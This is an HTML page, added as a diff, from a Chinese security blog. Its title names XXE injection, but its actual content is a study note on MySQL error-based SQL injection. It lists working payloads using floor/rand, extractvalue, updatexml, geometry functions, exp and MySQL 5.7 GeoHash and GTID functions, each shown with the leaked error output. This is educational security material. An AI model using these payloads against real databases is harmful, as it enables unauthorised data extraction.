@@ -1,0 +1,200 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>漏洞学习之XXE注入 | sh1yan&#39;blog</title>
+
+  
+  <meta name="author" content="shiyan">
+  
+
+  
+  <meta name="description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+  
+
+  
+  
+  <meta name="keywords" content="mysql,报错注入">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="漏洞学习之XXE注入">
+
+  <meta property="og:site_name" content="sh1yan&#39;blog">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">sh1yan&#39;blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/about">关于</a></li>
+      
+        <li><a href="/yqlj">友联</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>漏洞学习之XXE注入</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/02/19/mysql-Error-injection/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-02-19T07:40:55.000Z">
+          2018-02-19
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><strong>0x01</strong> 前言</p>
+<p>法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。</p>
+<p><strong>0x02</strong> floor()   // 5.0 , 5.1 , 5.5</p>
+<p>count() 匹配指定表，库里值的行数，也就是个数<br>concat() 把里面的参数字符串连接起来<br>floor() 向下取整，就是取整数显示<br>rand() 用于产生一个 0~1的随机数<br>group by 根据自己的命名来分组数据，左边为右边的键，右边为值，可以这么理解，具体的自己百度吧<br><a id="more"></a><br>mysql&gt; select first_name from users where user_id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);<br>ERROR 1062 (23000): Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
+<p>原理：通过 count(<em>) 来统计所查的数据库有多少个行数，其中以 concat() 拼接 user() 和 floor(rand(0)</em>2)) ，再配合上自己分组规则，导致统计时判断出错，从而造成的报错。</p>
+<p><strong>0x03</strong> extractvalue()   // 5.1 , 5.5 ， 报错结果32位长度限制</p>
+<p>extractvalue(XML_document, XPath_string) 从目标XML中返回包含所查询值的字符串</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>mysql&gt; select first_name from users where user_id=2 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost~’</p>
+<p>原理：由于第二位格式错误而导致的错误。</p>
+<p><strong>0x04</strong> updatexml()   // 5.1 , 5.5 , 报错结果32位长度限制</p>
+<p>updatexml(XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式</p>
+<p>mysql&gt; select first_name from users where user_id=3 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost~’</p>
+<p>原理：同 extractvalue() 一样，都是第二位格式错误到导致的错误。</p>
+<p><strong>0x05</strong> geometrycollection()   // 5.1 , 5.5</p>
+<p>geometrycollection(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20)) 一个好似坐标函数</p>
+<p>第一/二参数：坐标什么玩意，，，，<br>第三个参数：坐标里的一条直线，好像。。。</p>
+<p>mysql&gt; select first_name from users where user_id=4 and geometrycollection((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：通过 payload 可以大概的分析是嵌套式查询，然后这啥子的画图坐标无法识别然后报错（资料找不到啊啊啊）。</p>
+<p><strong>0x06</strong> polygon()   // 5.1 , 5.5 </p>
+<p>polygon() 一个几何操作的函数</p>
+<p>mysql&gt; select first_name from users where user_id=5 and polygon((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：几何都是抽象的，而我们的 payload 依旧是嵌套嵌套，不符合函数的匹配还是啥的就报错了。。。</p>
+<p><strong>0x07</strong> multipoint()   // 5.1 , 5.5</p>
+<p>multipoint() 从点值构造多点</p>
+<p>mysql&gt; select first_name from users where user_id=6 and multipoint((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：MP,杂都是类似几何的函数，，，原理同上。。。</p>
+<p><strong>0x08</strong> multilinestring()   // 5.1 , 5.5</p>
+<p>multilinestring() 是一种由LineStirng元素构成的MultiCurve几何对象集合</p>
+<p>mysql&gt; select first_name from users where user_id=7 and multilinestring((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：它也是数字坐标这样的用法，我们这里用了字符的样式，导致了报错。</p>
+<p><strong>0x09</strong> multipolygon()   // 5.1 , 5.5</p>
+<p>multipolygon() 是一种由Polygon元素构成的几何对象集合</p>
+<p>mysql&gt; select first_name from users where user_id=8 and multipolygon((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：这个函数的参数是 Polygon 元素，而我们传入了非元素，从而报错。</p>
+<p><strong>0x10</strong> linestring()   // 5.1 , 5.5</p>
+<p>LineString() 是具有点之间线性内插特性的Curve<br>LineString(1 1,2 2) 用法</p>
+<p>mysql&gt; select first_name from users where user_id=9 and linestring((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：用法上的错误，从而导致的报错。</p>
+<p><strong>0x11</strong> exp()   // 5.1 , 5.5</p>
+<p>exp() 计算e的x次方</p>
+<p>mysql&gt; select first_name from users where user_id=10 and exp(~(select * from(select user())a));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</p>
+<p>原理：其实这个是最简单的，exp()是计算e的次方的，参数本身就是数字，而报错语句通过子查询与按位求反来达到一个显错数据。</p>
+<p><strong>0x12</strong> mysql 5.7 中新增的报错函数   // 5.7.12</p>
+<p>PS ：这部分是直接抄的 luan 的笔记</p>
+<p>报错函数：</p>
+<p>ST_LatFromGeoHash() 返回一个字符串值从纬度Geohash作为双重价值的范围[−90, 90]   // 如果参数无效则报错，参数为数字型</p>
+<p>ST_LongFromGeoHash() 返回一个字符串值从经度Geohash作为双重价值的范围[−180, 180]   // 如果参数无效则报错，参数为数字型</p>
+<p>GTID_SUBSET() 给定两个集合的子集集合的全局事务ID和，如果所有子集gtids也在制定中。否则返回错误。   // GTID_SUBSET(subset,set)</p>
+<p>GTID_SUBTRACT() 给定两个集合的全局事务ID的集合和子集，只返回那些gtids从集合中的不在子集。   // GTID_SUBTRACT(set,subset)</p>
+<p>ST_PointFromGeoHash() 返回一个值,该值包含Geohash点的解码值，给定Geohash字符串值。   // 如果参数无效则报错，参数为数字型,xy坐标型函数</p>
+<p>案例：</p>
+<p>mysql&gt; select ST_LatFromGeoHash(version());<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function ST_LATFROMGEOHASH</p>
+<p>mysql&gt; select ST_LongFromGeoHash(version());<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function ST_LONGFROMGEOHASH</p>
+<p>mysql&gt; select GTID_SUBSET(version(),1);<br>ERROR 1772 (HY000): Malformed GTID set specification ‘5.7.12-log’.</p>
+<p>mysql&gt; select GTID_SUBTRACT(version(),1);<br>ERROR 1772 (HY000): Malformed GTID set specification ‘5.7.12-log’.</p>
+<p>mysql&gt; select ST_PointFromGeoHash(version(),1);<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function st_pointfromgeohash</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/渗透测试/">渗透测试</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/mysql/">mysql</a><a href="/tags/报错注入/">报错注入</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 shiyan
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
